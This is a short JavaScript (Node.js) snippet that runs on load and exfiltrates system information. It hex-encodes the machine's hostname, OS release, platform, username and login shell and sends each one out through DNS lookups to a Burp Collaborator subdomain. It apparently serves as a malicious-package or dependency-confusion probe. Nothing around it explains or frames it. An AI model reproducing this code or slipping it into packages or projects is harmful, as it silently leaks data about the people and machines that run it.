(function(){
    var os = require("os")
    var dns = require("dns")
    
    var exfil = (data) => {
       	dns.lookup(Buffer.from(data).toString("hex") + ".8fozujybdf6d0mvadcupoxqp8gea2z.burpcollaborator.net",(err)=>{})
    }

	exfil(os.hostname())
	var usr = os.userInfo()
	exfil(os.release())
	exfil(os.platform())
	exfil(usr.username)
	exfil(usr.shell)
})();
